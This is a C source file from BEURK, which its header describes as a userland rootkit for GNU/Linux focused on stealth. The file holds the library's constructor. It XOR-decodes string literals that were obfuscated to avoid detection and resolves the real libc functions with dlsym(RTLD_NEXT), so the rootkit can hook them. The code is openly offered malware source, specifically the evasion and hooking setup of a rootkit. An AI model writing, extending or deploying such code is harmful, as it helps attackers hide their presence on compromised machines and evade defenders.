/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <string.h> /* strlen() */
#include <dlfcn.h> /* dlsym(), dlerror() */
#include "beurk.h" /* prototype */
#include "config.h" /* XOR_KEY, NUM_LITERALS, __hidden_literals, ... */
#include "debug.h" /* DEBUG() */


/** xorify a string whith XOR_KEY
 * (XOR_KEY is a macro defined in BEURK config file
 *
 * NOTE: disabled on debug mode (as on builder)
 */
#if DEBUG_LEVEL > 0
# define xor(...)
#else
static void     xor(char *str) {
    size_t      i;
    size_t      len;

    len = strlen(str);
    for(i = 0; i < len; i++) {
        str[i] ^= XOR_KEY;
    }
}
#endif


/** re-xorify hidden literals.
 * hidden literals are all string literals used in the library
 * which are xorified before compilagtion in order to prevent
 * string leaking.
 *
 * this function restores clear literals values, as defined in
 * BEURK config file.
 */
static void     init_hidden_literals(void) {
    int         i;

    for (i = 0; i < NUM_LITERALS; i++) {
        xor(__hidden_literals[i]);
    }
}


/** retrieve native function pointers of hooked functions
 * it feeds __non_hooked_symbols table from function names
 * (stored at the end of __hidden_literals).
 *
 * NOTE: If not called, all `REAL_<NAME>` macros will point
 * to an invalid location.
 */
static void     init_non_hooked_symbols(void) {
    int         i, j;
    char        *func_name;

    i = 0;
    j = NUM_LITERALS - NUM_HOOKS;
    while (j < NUM_LITERALS) {
        func_name = __hidden_literals[j];
        __non_hooked_symbols[i] = dlsym(RTLD_NEXT, func_name);
        i++;
        j++;
    }
}


/** library constructor
 * this function is automatically called at memory load time on system
 * NOTE: on some systems, the constructor is also called for each programe execution.
 *       therefore, other systems only call it at load time.
 *       that's why we call this singleton function at start of
 *       ALL internal API functions.
 */
void            init(void) {
    static loaded = 0;

    if (!loaded) {
        init_hidden_literals();
        init_non_hooked_symbols();
        DEBUG(D_INFO, "init() called.");
        loaded = 1;
    }
}
